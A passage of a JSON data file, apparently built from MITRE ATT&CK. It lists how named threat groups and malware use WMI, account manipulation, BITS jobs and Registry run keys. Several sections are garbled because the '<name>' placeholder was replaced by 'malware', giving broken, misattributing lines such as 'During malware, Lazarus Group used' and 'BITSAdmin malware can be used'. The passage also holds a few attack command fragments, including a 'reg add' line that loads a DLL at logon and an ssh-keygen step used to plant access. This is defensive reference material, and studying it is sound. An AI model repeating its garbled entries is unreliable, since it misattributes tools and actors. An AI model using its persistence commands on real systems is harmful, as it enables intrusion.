            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can use WMI to execute commands.[74]"
            },
            "S0156": {
                "ID": "S0156",
                "Name": "KOMPROGO",
                "Description": "malware is capable of running WMI queries.[75]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.[76][77][78][79]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has used WMI for execution.[80]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can use WMI to log into remote machines for propagation.[81]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used a tool to run cmd /c wmic computersystem get domain for discovery.[82]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network.[83][84]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.[85][86][87]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware can use wmic.exe as part of its effort to delete shadow copies.[88]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware searches for anti-virus software and firewall products installed on the victim\u2019s machine using WMI.[89][90]"
            },
            "S0553": {
                "ID": "S0553",
                "Name": "MoleNet",
                "Description": "malware can perform WMI commands on the system.[91]"
            },
            "S0256": {
                "ID": "S0256",
                "Name": "Mosquito",
                "Description": "malware's installer uses WMI to search for antivirus display names.[92]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used malware that leveraged WMI for execution and querying host information.[93][94][95][96]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has executed PowerShell scripts via WMI.[97][98]"
            },
            "G0019": {
                "ID": "G0019",
                "Name": "Naikon",
                "Description": "malware has used WMIC.exe for lateral movement.[99]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware can use WMI to delete Shadow Volumes.[100]"
            },
            "S0368": {
                "ID": "S0368",
                "Name": "NotPetya",
                "Description": "malware can use wmic to help propagate itself across a network.[101][102]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware has used wmic.exe for local discovery information.[103]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used WMI for execution.[104]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware uses WMI to help propagate itself across a network.[105]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware uses WMI to perform discovery techniques.[106]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group used WMIC to executed a remote XSL script.[107]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors has used WMI to execute commands.[108]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware has a number of modules that use WMI to execute tasks.[109]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware's Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload.[110][111]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can use WMI queries to retrieve data from compromised hosts.[112][94]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may use WMI when collecting information about a victim.[113]"
            },
            "S0654": {
                "ID": "S0654",
                "Name": "ProLock",
                "Description": "malware can use WMIC to execute scripts on targeted hosts.[114]"
            },
            "S1032": {
                "ID": "S1032",
                "Name": "PyDCrypt",
                "Description": "malware has attempted to execute with WMIC.[115]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can execute WMI queries to gather information.[116]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware uses WMI to perform process monitoring.[117][118]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware executes received commands with wmic.exe (for WMI commands). [119]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can use WMI to monitor for and kill specific processes listed in its configuration file.[120][121]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware uses various WMI queries to check if the sample is running in a sandbox.[122][123]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used Impacket\u2019s WMIexec module for remote code execution and VBScript to run WMI queries.[5][124]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware can use WMI to execute PowerShell commands on a compromised machine.[125]"
            },
            "S0546": {
                "ID": "S0546",
                "Name": "SharpStage",
                "Description": "malware can use WMI for execution.[91][126]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware has used WMI to discover network connections and configurations. malware has also used the Win32_Process class to execute a malicious DLL.[127]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can use WMI for lateral movement.[128]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware can query the WMI class Win32_ComputerSystem to gather information.[129]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware has used WMI calls for script execution and system profiling.[130]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used WMI for the remote execution of files for lateral movement.[131][132]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware gathers system information via Windows Management Instrumentation (WMI).[133]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware has used the WMI command-line (WMIC) utility to run tasks.[134]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware used WMI with an explorer.exe token to execute on a remote share.[135]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware used the WMI query Select * From Win32_SystemDriver to retrieve a driver listing.[136]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can use WMI queries to detect the presence of a virtual machine environment.[137]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can use WMI for execution on a compromised host.[138]"
            },
            "G1018": {
                "ID": "G1018",
                "Name": "TA2541",
                "Description": "malware has used WMI to query targeted systems for security products.[139]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "A malware tool can use WMI to execute a binary.[140]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has used WMI to execute scripts for post exploit document collection.[141]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware droppers have used WMI classes to execute PowerShell commands.[142]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware can use wmic process call create in a scheduled task to launch plugins and for execution.[143]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has leveraged WMIC including for execution and remote system discovery.[144][145][146]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware utilizes wmic to delete shadow copies.[147][148][149]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used WMI to collect information about target machines.[150]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used WMI and LDAP queries for network discovery and to move laterally. malware has also used batch scripts to leverage WMIC to deploy ransomware.[151][152][153][154][155]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "One variant of malware uses WMI queries to gather information.[156]"
            }
        }
    },
    "T1098": {
        "ttp_name": "Account Manipulation",
        "ttp_id": "T1098",
        "href": "/techniques/T1098",
        "subtechnique": {
            "001": {
                "name": "Additional Cloud Credentials",
                "href": "/techniques/T1098/001",
                "description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.[1][2][3] These credentials include both x509 keys and passwords.[1] With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.[4]In infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP.[5] This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.[6][7]Adversaries may also use the CreateAccessKey API in AWS or the gcloud iam service-accounts keys create command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts).[8][9] For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator.[10] In AWS environments, adversaries with the appropriate permissions may also use the sts:GetFederationToken API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.[11]",
                "Procedure": {
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.[12]"
                    },
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users.[13]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 added credentials to OAuth Applications and Service Principals.[14][15]"
                    }
                }
            },
            "002": {
                "name": "Additional Email Delegate Permissions",
                "href": "/techniques/T1098/002",
                "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. For example, the Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.[1][2][3] In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.[4][5] Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.[6]This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.[7]",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used a Powershell cmdlet to grant the ApplicationImpersonation role to a compromised account.[8]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used a compromised global administrator account in Azure AD to backdoor a service principal with ApplicationImpersonation rights to start collecting emails from targeted mailboxes; <name> has also used compromised accounts holding ApplicationImpersonation rights in Exchange to collect emails.[9][10]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.[2]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.[11][12][13]"
                    }
                }
            },
            "003": {
                "name": "Additional Cloud Roles",
                "href": "/techniques/T1098/003",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.[1][2][3][4] With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).[5][4] This account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.For example, in AWS environments, an adversary with appropriate permissions may be able to use the CreatePolicyVersion API to define a new version of an IAM policy or the AttachUserPolicy API to attach an IAM policy with additional or distinct permissions to a compromised user account.[6]In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.[7]",
                "Procedure": {
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges.[8]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has added the global admin role to accounts they have created in the targeted organization's cloud instances.[9]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "During C0027, <name> used IAM manipulation to gain persistence and to assume or elevate privileges.[8]<name> has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.[10]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 granted company administrator privileges to a newly created service principle.[11]"
                    }
                }
            },
            "004": {
                "name": "SSH Authorized Keys",
                "href": "/techniques/T1098/004",
                "description": "Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys.[1] Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \"yes\" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \"add-metadata\" command an adversary may add SSH keys to a user account.[2][3] Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.[4] This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.[5][6] It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. SSH keys can also be added to accounts on network devices, such as with the ip ssh pubkey-chain Network Device CLI command.[7]",
                "Procedure": {
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> creates a new key pair with ssh-keygen and drops the newly created user key in authorized_keys to enable remote login.[8]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has dropped an SSH-authorized key in the /root/.ssh folder in order to access a compromised server with SSH.[9]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has the ability to add the public key of its handlers to the authorized_keys file to maintain persistence on an infected host.[10]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has added RSA keys in authorized_keys.[11][12]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> will create an ssh key if necessary with the ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P command. <name> will upload a private key file to the server to remotely access the host without a password.[13]"
                    }
                }
            },
            "005": {
                "name": "Device Registration",
                "href": "/techniques/T1098/005",
                "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.[1][2] In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. [3]Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.[4][5][6] Devices registered in Azure AD may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.[7] Additionally, an adversary may be able to perform a Service Exhaustion Flood on an Azure AD tenant by registering a large number of devices.[8]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can register a device to Azure AD.[9]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.[3][10]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN.[11]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command.[12]"
                    }
                }
            },
            "006": {
                "name": "Additional Container Cluster Roles",
                "href": "/techniques/T1098/006",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.[1][2] Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.[3]This account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised.  Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.[4][5][6] In these cases, this technique may be used in conjunction with Additional Cloud Roles.",
                "Procedure": {}
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.[1] These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",
        "Procedure": {
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network.[2]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has been known to add created accounts to local admin groups to maintain elevated access.[3]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware has added user accounts to the User and Admin groups.[4]"
            },
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation.[5]"
            },
            "S0274": {
                "ID": "S0274",
                "Name": "Calisto",
                "Description": "malware adds permissions and remote logins to all users.[6]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware elevates accounts created through the malware to the local administration group during execution.[7]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has added newly created accounts to the administrators group to maintain elevated access.[8]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has assigned newly created accounts the sysadmin role to maintain persistence.[9]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has granted privileges to domain accounts.[10]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has added accounts to specific groups with net localgroup.[11]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware malware WhiskeyDelta-Two contains a function that attempts to rename the administrator\u2019s account.[12][13]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.[14]"
            },
            "S0002": {
                "ID": "S0002",
                "Name": "Mimikatz",
                "Description": "The malware credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.[15][16]"
            },
            "S0382": {
                "ID": "S0382",
                "Name": "ServHelper",
                "Description": "malware has added a user named \"supportaccount\" to the Remote Desktop Users and Administrators groups.[17]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware has added user accounts to local Admin groups.[1]"
            }
        }
    },
    "T1197": {
        "ttp_name": "BITS Jobs",
        "ttp_id": "T1197",
        "href": "/techniques/T1197",
        "tactic": "Defense Evasion",
        "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM).[1][2] BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.[2][3]Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.[4][5][6] BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).[7][4]BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.[4]",
        "Procedure": {
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used the BITS protocol to exfiltrate stolen data from a compromised host.[8]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used BITSAdmin to download and install payloads.[9][10]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware has been downloaded via Windows BITS functionality.[11]"
            },
            "S0190": {
                "ID": "S0190",
                "Name": "BITSAdmin",
                "Description": "malware can be used to create BITS Jobs to launch a malicious process.[12]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can download a hosted \"beacon\" payload using BITSAdmin.[13][14][15]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware has used BITSadmin to download and execute malicious DLLs.[16]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "A malware variant downloads the backdoor payload via the BITS service.[17]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has used BITSAdmin to download additional tools.[18]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can use BITS Utility to connect with the C2 server.[19]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware has used BITS jobs to download malicious payloads.[20]"
            },
            "S0654": {
                "ID": "S0654",
                "Name": "ProLock",
                "Description": "malware can use BITS jobs to download its malicious payload.[21]"
            },
            "S0333": {
                "ID": "S0333",
                "Name": "UBoatRAT",
                "Description": "malware takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.[7]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine.[22]"
            }
        }
    },
    "T1547": {
        "ttp_name": "Boot or Logon Autostart Execution",
        "ttp_id": "T1547",
        "href": "/techniques/T1547",
        "subtechnique": {
            "001": {
                "name": "Registry Run Keys / Startup Folder",
                "href": "/techniques/T1547/001",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.[1] These programs will be executed under the context of the user and will have the account's associated permissions level.The following run keys are created by default on Windows systems:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.[1] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [4]Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.The following Registry keys can be used to set startup folder items for persistence:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersThe following Registry keys can control automatic startup of services during boot:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.By default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "Procedure": {
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[5][6][7]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> can add itself to the Registry as a startup program to establish persistence.[8][9]"
                    },
                    "S1025": {
                        "ID": "S1025",
                        "Name": "Amadey",
                        "Description": "<name> has changed the Startup folder to the one containing its executable by overwriting the registry keys.[10][11]"
                    },
                    "S1074": {
                        "ID": "S1074",
                        "Name": "ANDROMEDA",
                        "Description": "<name> can establish persistence by dropping a sample of itself to C:\\ProgramData\\Local Settings\\Temp\\mskmde.com and adding a Registry run key to execute every time a user logs on.[12]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> has the ability to create the Registry key name EstsoftAutoUpdate at HKCU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce to establish persistence.[13]"
                    },
                    "G0026": {
                        "ID": "G0026",
                        "Name": "APT18",
                        "Description": "<name> establishes persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key.[14][15]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "An <name> HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.[16]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has deployed malware that has copied itself to the startup directory for persistence.[17]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> added Registry Run keys to establish persistence.[18]"
                    },
                    "G0022": {
